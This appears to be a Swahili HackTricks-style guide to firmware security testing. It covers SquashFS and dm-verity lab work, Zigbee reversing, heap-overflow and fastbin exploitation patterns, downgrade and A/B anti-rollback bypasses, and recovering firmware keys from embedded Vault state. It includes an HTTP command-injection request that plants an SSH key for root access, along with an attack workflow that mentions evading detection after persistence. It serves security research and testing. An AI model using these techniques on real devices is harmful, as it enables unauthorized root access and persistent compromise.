Ikiwa superblock ya SquashFS inaweza kusomeka lakini offsets za inode, directory au jedwali la fragment haziwezekani, usiibadilishe `unsquashfs` mara moja. Fanya reverse engineering ya binary ya boot ya mapema na uunde upya grafu ya vifaa vya block inayoundwa nayo: mifumo iliyopachikwa inaweza kuonyesha partition ya root inayoonekana ya kawaida, lakini ikaunda mfumo halisi wa faili kwa kutumia mapping ya `dm-linear` inayoongeza sekta zilizokopwa kutoka partition nyingine. Ukaguzi wa superblock pekee unaweza kufaulu hata kama kila block ya metadata inayofuata imehamishwa.<sup>[[11]](#references)</sup>

Hifadhi hesabu za firmware kama zilivyo. Hasa, bainisha kama urefu ni bytes, sekta za biti 512 au kurasa za 4 KiB; rudia shifts na truncation kwa mpangilio wake wa awali; na zingatia maeneo ya mwisho yanayotegemea bank katika miundo ya A/B. Kwa mfano, `(partition_bytes >> 12) << 3` kwanza hukata thamani hadi kwenye mpaka wa 4 KiB, kisha huonyesha matokeo kama sekta za biti 512; kuibadilisha na `partition_bytes // 512` kunaweza kusogeza eneo lililoongezwa kwa kilobytes chache na kuharibu majedwali yote ya SquashFS yanayofuata.<sup>[[11]](#references)</sup>

Mtiririko mzuri wa uthibitishaji ni:<sup>[[11]](#references)</sup>

1. Pata kila segment ya `dm-linear`—kifaa chanzo, sekta ya kuanzia na urefu—kutoka kwenye binary ya verifier/init.
2. Unganisha au mapisha maeneo hayo bila kubadilisha semantiki zake za alignment.
3. Ikiwa uchimbuaji bado unashindwa, tafuta ndani ya eneo dogo tu linalozunguka mpaka uliotabiriwa, na hitaji miundo kadhaa halali ya metadata mfululizo badala ya kukubali superblock inayoonekana kuwa sahihi pekee.
4. Tumia `unsquashfs` ambayo haijabadilishwa kwenye image iliyojengwa upya; kufanikiwa kupitia directories na fragments zote ni ushahidi imara zaidi kuliko `unsquashfs -stat`.

#### Ubadilishaji wa dm-verity unaodhibitiwa na mchambuzi

Mchambuzi anapodhibiti kernel ya QEMU, initramfs na diski pepe, root iliyorekebishwa inaweza kuwashwa kwa kubadilisha PID 1 ya uthibitishaji ya vendor na init ndogo iliyounganishwa statically. Huu ni **ubadilishaji wa boot chain wa maabara**, si kuvunja dm-verity, sahihi yake ya RSA, Secure Boot au ufunguo uliofungwa kwa TPM.<sup>[[11]](#references)</sup>

Init mbadala inapaswa kuiga sehemu za kiutendaji za njia ya awali ya boot: mount `devtmpfs`, kuita `setsid()`, kuunganisha `/dev/console` na file descriptors 0–2, mount `/proc` na `/sys`, kusubiri kifaa cha block kilichotolewa, mount root iliyohaririwa kwa hali ya kusoma pekee, kutenganisha pseudo-filesystems za root ya awali, kuhamisha mount mpya juu ya `/`, kutumia `chroot`, na kutekeleza `/sbin/init` ya awali ya firmware kwa `execve()`. Kutenganisha `/dev`, `/proc` na `/sys` **kabla** ya `MS_MOVE` huepusha kutenganisha kwa bahati mbaya mount points za root mpya.<sup>[[11]](#references)</sup>

Weka hali ya kifaa inayoweza kubadilika tofauti na root iliyorekebishwa isiyoweza kubadilika. Overlay ya qcow2 inaweza kuhifadhi hali ya LVM ya diski asili huku diski ya pili ya virtio ya kusoma pekee ikitoa SquashFS iliyohaririwa:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Utatuzi wa hitilafu za hali ya image nje ya mtandao

Kagua hali endelevu nje ya guest wakati kuwasha kunapochelewa, script za uanzishaji zinapofuta data, au logging ya console isiyotegemewa inapoficha hitilafu. Usiambatishe overlay inayotumiwa na VM inayoendeshwa; ifichue kwa `qemu-nbd`, zuia ugunduzi wa LVM kwenye partition ya NBD iliyokusudiwa, na uzime volume group kabla ya kuikata.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Kwa utenganishaji wa hitilafu unaoweza kurudiwa, andika faili za alama zenye mihuri ya muda kwenye volume thabiti inayoweza kuandikiwa, kisha uzithibitishe ukiwa offline; `/dev/kmsg`, FIFOs na consoles za muda zinaweza kutoa matokeo hasi ya uongo kutokana na rate limiting au mchakato kufa mapema. Pia linganisha interfaces halisi katika tabaka mbalimbali kabla ya kubadilisha msimbo usiohusika: `uname -r` dhidi ya `/lib/modules/`, vipengele vya ext4 vilivyo kwenye diski dhidi ya usanidi wa kernel, na kizazi cha Mesa `libGL` dhidi ya DRI driver ABI na majina ya driver yanayotokana na PCI. Kipengele kinaweza kuwepo na hata `dlopen()` ikafanikiwa, lakini bado kisiweze kutumika kwa sababu mtumiaji wake anatarajia ABI tofauti.<sup>[[11]](#references)</sup>

## Dynamic Analysis kwa Vitendo

Katika hatua hii, mazingira ya kifaa halisi au kilichoigwa hutumiwa kwa uchambuzi. Ni muhimu kudumisha ufikiaji wa shell kwa OS na filesystem. Uigaji huenda usiige kikamilifu mwingiliano wa hardware, hivyo wakati mwingine uigaji huhitaji kuwashwa upya. Uchambuzi unapaswa kuchunguza tena filesystem, kutumia vibaya webpages na huduma za mtandao zilizo wazi, na kuchunguza udhaifu wa bootloader. Majaribio ya uadilifu wa firmware ni muhimu ili kutambua udhaifu unaoweza kusababishwa na backdoor.

## Mbinu za Runtime Analysis

Runtime analysis huhusisha kuingiliana na mchakato au binary katika mazingira yake ya uendeshaji, kwa kutumia zana kama gdb-multiarch, Frida na Ghidra kuweka breakpoints na kutambua udhaifu kupitia fuzzing na mbinu nyingine.

Kwa embedded targets zisizo na debugger kamili, **nakili `gdbserver` iliyounganishwa kwa njia tuli** kwenye kifaa na uunganishe nayo kwa mbali:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Uchoraji wa ramani ya ujumbe wa Zigbee / radio-co-processor

Kwenye IoT hubs, RF stack mara nyingi hugawanywa kati ya **radio MCU** na mchakato wa Linux userland. Workflow muhimu ni kuchora ramani ya njia:<sup>[[8]](#references)</sup>

1. **RF frame** inayosafirishwa hewani
2. **controller-side parser** kwenye radio MCU
3. **serial/UART text au TLV protocol** inayotumwa kwa Linux (kwa mfano `/dev/tty*`)
4. **application dispatcher** kwenye daemon kuu
5. **protocol-specific handler / state machine**

Muundo huu unaleta maeneo mawili ya reversing badala ya moja. Ikiwa controller inabadilisha binary radio frames kuwa protocol ya maandishi kama `Group,Command,arg1,arg2,...`, tambua:

- **message groups** na dispatch tables
- Ujumbe upi unaweza kutoka kwenye **network** dhidi ya controller yenyewe
- **manufacturer-specific discriminator fields** halisi (kwa mfano Zigbee `manufacturer_code` na `cluster_command` maalum)
- Ni handlers zipi zinazofikiwa tu wakati wa **commissioning**, discovery, au awamu za kupakua firmware/model

Kwa Zigbee hasa, rekodi pairing traffic na uangalie kama kifaa lengwa bado kinatumia **Link Key** chaguomsingi `ZigBeeAlliance09`. Ikiwa ndivyo, kunasa commissioning traffic kunaweza kufichua **Network Key**. Zigbee 3.0 install codes hupunguza hatari hii, kwa hiyo hakikisha kama kifaa kilichojaribiwa kinazitekeleza kweli.

### Manufacturer-specific protocol handlers na ufikikaji unaodhibitiwa na FSM

Amri za vendor-specific Zigbee/ZCL mara nyingi huwa shabaha bora kuliko clusters zilizosanifishwa kwa sababu hupeleka data kwenye **custom parsing code** na **FSMs** za ndani zenye uthibitishaji ambao haujajaribiwa sana.<sup>[[8]](#references)</sup>

Workflow ya vitendo:

- Reverse command dispatcher hadi upate **vendor-only handler**.
- Tambua majedwali ya **FSM state**, **event**, **check**, **action**, na **next-state**.
- Tambua **transitional states** zinazoendelea zenyewe na matawi ya retry/error ambayo hatimaye hufanya reset au kufuta state inayodhibitiwa na mshambuliaji.
- Thibitisha ni mabadilishano gani halali ya protocol yanahitajika ili kuweka daemon katika state inayoweza kudhulumiwa, badala ya kudhani handler yenye hitilafu inaweza kufikiwa wakati wowote.

Kwa protocols zinazotegemea muda, packet replay kutoka kwenye Python framework inaweza kuwa ya polepole mno. Njia inayotegemewa zaidi ni kuiga kifaa halali kwenye hardware halisi (kwa mfano **nRF52840**) kwa kutumia stack ya kiwango cha vendor, ili kuonyesha **endpoints**, **attributes**, na muda sahihi wa commissioning.

### Aina ya hitilafu ya fragmented-download katika embedded daemons

Aina ya hitilafu inayojirudia kwenye firmware hujitokeza katika upakuaji wa **fragmented blob/model/configuration**:<sup>[[8]](#references)</sup>

1. **Fragment ya kwanza** (`offset == 0`) huhifadhi `ctx->total_size` na kutenga kumbukumbu kwa `malloc(total_size)`.
2. Fragments zinazofuata hukagua tu sehemu za **packet-local** zinazodhibitiwa na mshambuliaji, kama vile `packet_total_size >= offset + chunk_len`.
3. Nakala hutumia `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bila kuhakiki dhidi ya **ukubwa wa awali uliotengewa**.

Hii humwezesha mshambuliaji kutuma:

- Fragment halali ya kwanza yenye ukubwa mdogo uliotangazwa, ili kulazimisha allocation ndogo ya heap.
- Fragment ya baadaye yenye **offset inayotarajiwa** lakini `chunk_len` kubwa zaidi.
- Ukubwa wa packet-local ulioghushiwa unaopita ukaguzi mpya huku bado ukisababisha overflow ya buffer iliyotengewa awali.

Ikiwa njia yenye hitilafu iko nyuma ya commissioning logic, exploitation lazima ijumuishe **device emulation** ya kutosha ili kupeleka kifaa lengwa kwenye state inayotarajiwa ya model-download au blob-download kabla ya kutuma fragments zilizoharibika.

### Vichochezi vya `free()` vinavyoendeshwa na protocol

Kwenye embedded daemons, njia rahisi zaidi ya kusababisha heap metadata exploitation mara nyingi si “kusubiri cleanup”, bali **kulazimisha error handling ya protocol yenyewe**:<sup>[[8]](#references)</sup>

- Tuma fragments za ufuatiliaji zilizoharibika ili kupeleka FSM kwenye states za **retry** au **error**.
- Vuka kiwango cha juu cha retries ili daemon ifanye **reset context** na kufuta buffer iliyoharibika.
- Tumia `free()` hii inayotabirika kusababisha allocator-side primitives kabla mchakato hauja-crash kwa sababu nyingine.

Hii ni muhimu hasa dhidi ya allocators za aina ya **musl/uClibc/dlmalloc** kwenye embedded Linux, ambapo kuharibu chunk metadata kunaweza kubadilisha unlink/unbin logic kuwa write primitive. Mbinu thabiti ni kuharibu **size field** ili kuelekeza allocator traversal kwenye **fake chunks zilizowekwa ndani ya buffer iliyo-overflow**, badala ya kuharibu mara moja pointers halisi za bin na ku-crash mchakato.

## Binary Exploitation na Proof-of-Concept

Kutengeneza PoC kwa vulnerabilities zilizotambuliwa kunahitaji uelewa wa kina wa usanifu wa kifaa lengwa na ujuzi wa programming katika lugha za kiwango cha chini. Binary runtime protections ni nadra kwenye embedded systems, lakini zinapokuwepo, mbinu kama Return Oriented Programming (ROP) zinaweza kuhitajika.

### Vidokezo vya uClibc fastbin exploitation (embedded Linux)

- **Fastbins + consolidation:** uClibc hutumia fastbins zinazofanana na za glibc. Allocation kubwa inayofuata inaweza kusababisha `__malloc_consolidate()`, kwa hiyo fake chunk yoyote lazima ipite ukaguzi (ukubwa unaokubalika, `fd = 0`, na chunks zinazozunguka zinazoonekana kuwa “in use”).<sup>[[6]](#references)</sup>
- **Binaries zisizo PIE chini ya ASLR:** ikiwa ASLR imewezeshwa lakini binary kuu ni **non-PIE**, anwani za `.data/.bss` ndani ya binary hubaki thabiti. Unaweza kulenga eneo ambalo tayari linafanana na heap chunk header halali ili kuelekeza fastbin allocation kwenye **function pointer table**.
- **NUL inayosimamisha parser:** JSON inapochanganuliwa, `\x00` kwenye payload inaweza kusimamisha uchanganuzi huku ikiacha bytes zinazofuata zinazodhibitiwa na mshambuliaji kwa stack pivot/ROP chain.
- **Shellcode kupitia `/proc/self/mem`:** ROP chain inayopiga `open("/proc/self/mem")`, `lseek()`, na `write()` inaweza kuweka shellcode inayoweza kutekelezwa kwenye mapping inayojulikana na kisha kurukia humo.

## Operating Systems Zilizotayarishwa kwa Firmware Analysis

Operating systems kama [AttifyOS](https://github.com/adi0x90/attifyos) na [EmbedOS](https://github.com/scriptingxss/EmbedOS) hutoa mazingira yaliyosanidiwa awali kwa ajili ya upimaji wa usalama wa firmware, yakiwa na zana zinazohitajika.

## OS Zilizotayarishwa kwa Uchambuzi wa Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS ni distro iliyoundwa kukusaidia kufanya tathmini ya usalama na penetration testing ya vifaa vya Internet of Things (IoT). Huokoa muda mwingi kwa kutoa mazingira yaliyosanidiwa awali yenye zana zote zinazohitajika.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Operating system ya upimaji wa usalama wa embedded, inayotegemea Ubuntu 18.04 na iliyosheheni awali zana za upimaji wa usalama wa firmware.

## Firmware Downgrade Attacks na Njia za Update Zisizo Salama

Hata vendor anapotekeleza ukaguzi wa cryptographic signature kwa firmware images, **ulinzi dhidi ya version rollback (downgrade) mara nyingi huachwa**. Boot- au recovery-loader inapothibitisha tu signature kwa kutumia public key iliyopachikwa lakini hailinganishi *version* (au monotonic counter) ya image inayowekwa, mshambuliaji anaweza kusakinisha kihalali **firmware ya zamani, yenye udhaifu, ambayo bado ina signature halali** na hivyo kurejesha vulnerabilities zilizokuwa zimerekebishwa.<sup>[[4]](#references)</sup>

Workflow ya kawaida ya shambulio:

1. **Pata image ya zamani iliyosainiwa**
   * Ichukue kutoka kwenye tovuti ya umma ya vendor ya kupakua, CDN au tovuti ya usaidizi.
   * Itoe kutoka kwenye companion mobile/desktop applications (kwa mfano ndani ya Android APK kwenye `assets/firmware/`).
   * Ipate kutoka kwenye third-party repositories kama VirusTotal, Internet archives, forums, n.k.
2. **Pakia au toa image kwa kifaa** kupitia njia yoyote ya update iliyo wazi:
   * Web UI, mobile-app API, USB, TFTP, MQTT, n.k.
   * Vifaa vingi vya IoT vya watumiaji vina HTTP(S) endpoints *zisizohitaji uthibitishaji* ambazo hupokea firmware blobs zilizosimbwa kwa Base64, huzifungua upande wa server na kuanzisha recovery/upgrade.
3. Baada ya downgrade, exploit udhaifu uliorekebishwa kwenye release mpya zaidi (kwa mfano command-injection filter iliyoongezwa baadaye).
4. Kwa hiari, rudisha image ya hivi karibuni au zima updates ili kuepuka kugunduliwa baada ya kupata persistence.

### Mfano: Command Injection Baada ya Downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

Katika firmware yenye udhaifu (iliyorejeshwa kwenye toleo la zamani), parameter ya `md5` inaunganishwa moja kwa moja kwenye amri ya shell bila kusafishwa, hivyo kuruhusu kuingiza amri kiholela (hapa, kuwezesha ufikiaji wa root kupitia SSH key). Matoleo ya baadaye ya firmware yaliongeza kichujio cha msingi cha herufi, lakini kutokuwepo kwa ulinzi dhidi ya downgrade kunafanya marekebisho hayo yasiwe na maana.<sup>[[4]](#references)</sup>

### Kutoa Firmware Kutoka kwa Programu za Simu

Wauzaji wengi hujumuisha picha kamili za firmware ndani ya programu zao saidizi za simu ili programu iweze kusasisha kifaa kupitia Bluetooth/Wi-Fi. Vifurushi hivi mara nyingi huhifadhiwa bila usimbaji fiche ndani ya APK/APEX, katika njia kama `assets/fw/` au `res/raw/`. Zana kama `apktool`, `ghidra`, au hata `unzip` ya kawaida hukuwezesha kutoa picha zilizosainiwa bila kugusa maunzi halisi.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Kupita anti-rollback inayotekelezwa na updater pekee katika miundo ya slot za A/B

Baadhi ya vendors hutekeleza **ratchet** ya kuzuia downgrade, lakini ndani ya logic ya *updater* pekee (kwa mfano, routine ya UDS kupitia CAN, amri ya recovery, au agent ya OTA ya userspace). Ikiwa **bootloader** baadaye hukagua tu signature/CRC ya image na kuamini jedwali la partition au metadata ya slot, ulinzi wa rollback bado unaweza kupitwa.<sup>[[7]](#references)</sup>

Muundo dhaifu wa kawaida:

- Metadata ya firmware huwa na descriptor ya version na **security ratchet** / counter ya monotonic.
- Updater hulinganisha ratchet ya image na thamani iliyohifadhiwa kwenye persistent storage na kukataa images za zamani zilizosainiwa.
- **Bootloader** haisomi ratchet hiyo na huthibitisha tu header, CRC na signature kabla ya kuwasha slot iliyochaguliwa.
- Uamilishaji wa slot huhifadhiwa kando katika jedwali la partition au counter ya generation kwa kila slot na **haujaunganishwa kwa njia ya cryptographic** na digest halisi ya firmware iliyothibitishwa.

Hii huunda primitive ya **kuthibitisha image moja / kuwasha image nyingine** katika mifumo ya dual-slot. Ikiwa mshambuliaji anaweza kufanya updater itie alama slot B kuwa lengwa la kuwashwa linalofuata kwa kutumia image ya sasa iliyosainiwa, kisha baadaye kuandika upya slot B kabla ya reboot, bootloader bado inaweza kuwasha image iliyoshushwa toleo kwa sababu huamini tu metadata ya slot ambayo tayari imehifadhiwa.

Mfumo wa kawaida wa matumizi mabaya:

1. Pakia firmware **ya sasa iliyosainiwa** kwenye slot isiyotumika na uendeshe routine ya kawaida ya uthibitishaji/ubadilishaji ili layout itie alama slot hiyo kuwa inayofuata kuamilishwa.
2. **Usifanye reboot bado**. Ingia tena kwenye routine ya kuandaa/kufuta slot katika session hiyo hiyo.
3. Tumia vibaya hali ya zamani ya boot au logic ya zamani ya uteuzi wa slot ili updater ifute **slot ileile ya kimwili** iliyopandishwa muda mfupi uliopita.
4. Andika firmware **ya zamani lakini bado iliyosainiwa** kwenye slot hiyo.
5. Ruka routine ya uthibitishaji inayotekeleza ratchet na ufanye reboot moja kwa moja.
6. Bootloader huchagua slot iliyopandishwa, huthibitisha signature/integrity pekee, na kuwasha image ya zamani.

Mambo ya kutafuta unapofanya reverse engineering ya utekelezaji wa update wa A/B:

- Uteuzi wa slot unaotokana na **bendera za wakati wa kuwasha** ambazo hazisasishwi baada ya ubadilishaji kufanikiwa.
- Routine ya aina ya `prepare_passive_slot()` inayofuta slot kulingana na hali ya zamani badala ya **layout ya sasa iliyothibitishwa**.
- Function ya aina ya `part_write_layout()` inayoongeza tu **generation counter** / bendera ya active na haihifadhi hash ya image iliyothibitishwa.
- Ukaguzi wa ratchet unaotekelezwa kwenye userspace au code ya updater, lakini **sio** kwenye ROM / bootloader / hatua za secure boot.
- Routines za kufuta au recovery zinazoacha slot ikiwa imetiwa alama kuwa inaweza kuwashwa hata baada ya maudhui yake kufutwa na kuandikwa upya.

### Orodha ya Kukagua Logic ya Update

* Je, usafirishaji/uthibitishaji wa *update endpoint* umelindwa vya kutosha (TLS + authentication)?
* Je, kifaa hulinganisha **namba za version** au **monotonic anti-rollback counter** kabla ya ku-flash?
* Je, image huthibitishwa ndani ya secure boot chain (kwa mfano, signatures hukaguliwa na code ya ROM)?
* Je, **bootloader hutekeleza ratchet ileile** kama updater, badala ya kukagua signature/CRC pekee?
* Je, metadata ya uamilishaji wa slot **imefungamanishwa na digest/version ya firmware iliyothibitishwa**, au slot inaweza kubadilishwa baada ya kupandishwa?
* Baada ya ubadilishaji wa slot kufanikiwa, je, kifaa hulazimishwa kufanya reboot au bado routines za baadaye za update/kufuta zinaweza kufikiwa katika session hiyo hiyo?
* Je, code ya userland hufanya ukaguzi mwingine wa sanity (kwa mfano, ramani ya partition inayoruhusiwa, namba ya model)?
* Je, mtiririko wa update wa *sehemu* au wa *backup* hutumia tena logic ileile ya uthibitishaji?

> 💡  Ikiwa mojawapo ya yaliyo hapo juu haipo, kuna uwezekano platform inaweza kushambuliwa kwa rollback.

## Firmware hatarishi ya kufanya mazoezi

Ili kufanya mazoezi ya kugundua udhaifu kwenye firmware, tumia miradi ifuatayo ya firmware hatarishi kama mwanzo.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Kurejesha funguo za usimbuaji za firmware kutoka hali ya KMS/Vault iliyopachikwa

Wakati image ya update inachanganya metadata ndogo ya plaintext na blob kubwa yenye entropy nyingi, kagua container kabla ya kujaribu brute-force:<sup>[[1]](#references)</sup>

- Toa headers, offsets na mipaka ya mistari kwa kutumia `hexdump`, `xxd`, `strings -tx`, `base64 -d`, na `binwalk -E`.
- `Salted__` kwa kawaida humaanisha umbizo la OpenSSL `enc`: bytes 8 zinazofuata ni salt na bytes zilizobaki ni ciphertext.
- Sehemu ya Base64 inayodecode hadi bytes `256` kamili ni kidokezo kikubwa kwamba unatazama ciphertext ya RSA-2048 inayofunga password/random session key ya firmware.
- Nyenzo za PGP zilizotenganishwa kwenye faili hiyo hiyo mara nyingi hulinda uhalisi pekee; usidhani kuwa ndiyo njia ya kulinda usiri.

Ikiwa utafutaji wa funguo tuli (`grep`, `strings`, utafutaji wa PEM/PGP) haufanikiwi, fanya reverse engineering ya **njia ya uendeshaji ya decrypt** badala ya kutafuta private keys pekee:

- Decompile updater / binary ya usimamizi na ufuatilie ni nani anayesoma blob iliyosimbwa, helper/API gani inayoifungua, na jina gani la kimantiki la key inaloomba.
- Tafuta kwenye root filesystem iliyotolewa hali ya KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) pamoja na unit files na init scripts.
- Chukulia `vault operator unseal ...` ya plaintext, recovery keys, bootstrap tokens, au scripts za local KMS auto-unseal kuwa sawa na nyenzo za private key.

Ikiwa appliance inasafirisha binary asilia ya Vault na storage backend, kuendesha tena mazingira hayo kwa kawaida ni rahisi kuliko kutekeleza upya mambo ya ndani ya Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Ukiwa na root kwenye KMS iliyoklonishwa:

- Fanya transit keys ziweze kuhamishwa nje ya clone iliyotengwa pekee: `vault write transit/keys/<name>/config exportable=true`
- Hamisha unwrap key: `vault read transit/export/encryption-key/<name>`
- Jaribu recovered RSA key ukitumia jozi halisi ya padding/hash inayotumiwa na KMS. Kushindwa kwa decrypt ya PKCS#1 v1.5 na decrypt ya kawaida ya OAEP **hakuthibitishi** kuwa key si sahihi; mtiririko mwingi unaotumia Vault hutumia OAEP yenye SHA-256, ilhali maktaba nyingi hutumia SHA-1 kama chaguo-msingi.
- Ikiwa payload inaanza na `Salted__`, tekeleza upya KDF ya OpenSSL ya mtengenezaji kwa usahihi (`EVP_BytesToKey`, mara nyingi MD5 kwenye vifaa vya zamani) kabla ya kujaribu decrypt ya AES-CBC.

Hii hubadilisha “firmware iliyosimbwa” kuwa tatizo pana zaidi: **rejesha operational keys za upande wa kifaa, kisha tekeleza upya offline vigezo halisi vya unwrap + KDF**.

## Mafunzo na Vyeti

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Kuvunja Firmware kwa Claude: Ujuzi wa Kiwango cha Mtaalamu, Uhuru wa Kiwango cha Mwanzilishi](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Mbinu ya Kupima Usalama wa Firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Practical IoT Hacking: Mwongozo Mahususi wa Kushambulia Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Kutumia zero-days kwenye hardware iliyoachwa – blogu ya Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Jinsi Kifaa Mahiri cha $20 Kilivyonipa Ufikiaji wa Nyumba Yako](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Sasa Unaniona: Sasa Umepwnwa](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Kutumia Tesla Wall Connector kupitia kiunganishi chake cha charge port - Sehemu ya 2: kukwepa ulinzi dhidi ya downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Ifanye Iwakae: Kutumia Philips Hue Bridge kupitia Over-the-Air](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS kwenye QEMU Sehemu ya 1: Kufungua kifurushi](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Nyaraka za Linux kernel - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [ROOT Tesla OS kwenye QEMU Sehemu ya 2: Kutatua hitilafu na kurekebisha](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Nywila za Dell BIOS: Usimbaji fiche dhaifu wa XOR huruhusu kurejesha kutoka SPI Flash (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Zana za kurejesha nywila za Dell BIOS](https://github.com/R3n5k1/dellpwn)
- [14] [VoidStar Security — Kujiimarisha katika Hardware Hacking Sehemu ya 2](https://voidstarsec.com/blog/brushing-up-part-2)
- [15] [Jinsi na Kwa Nini Tulivyonhack Cypherock Hardware Wallet: Hadithi Kamili](https://www.darknavy.org/blog/how_and_why_we_hacked_cypherock_hardware_wallet_the_full_story/)
{{#include ../../banners/hacktricks-training.md}}
